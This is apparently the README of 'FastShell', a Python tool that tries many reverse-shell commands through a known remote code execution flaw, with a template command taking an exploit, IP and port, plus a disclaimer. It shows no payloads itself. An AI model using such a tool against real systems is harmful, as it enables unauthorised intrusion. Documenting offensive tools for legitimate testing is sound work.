
<h2 align="center">Free Palestine</h2>

# FastShell ⚡

![indir (6)](https://github.com/Yusuf-YENICERI/FastShell/assets/38917909/4e32a4ba-e3aa-49ea-afae-70a26e3c8ee4)

Get your revshell in seconds!

## Why to use it?
Fastshell allows you to run many revshell commands with one line of command and it works with your command.

Let's assume that we found a rce in somewhere in an app and we want to get shell. What would we do in that case?
Well i go to a revshell generator online and i try them one by one.
No more that just set your command, ip, port and boom! You are in!

## How to use it?
This program requires 3 arguments, your command, ip and port of your host.

Assume you use the below command to run your exploit:

``
python3 exploit.py id(or any command you want)
``

Then you just need to do it:

``
python3 revshell.py "python3 exploit.py {revshell}", "your ip", "your port"
``

The things is to replace {revshell}, the exact text with the rce command you use and add ip and port.

## Warning
This program somehow breaks my python on Windows and it does not run. So try to use Linux. The problem might be related with the commands in the file. I'm not sure.

## Disclaimer
THIS TOOL IS FOR LEGAL PURPOSES ONLY!
I DO NOT CARRY ANY RESPONSIBILITY OF THIS TOOL'S WRONG USAGE. SO TAKE YOUR OWN RISK.
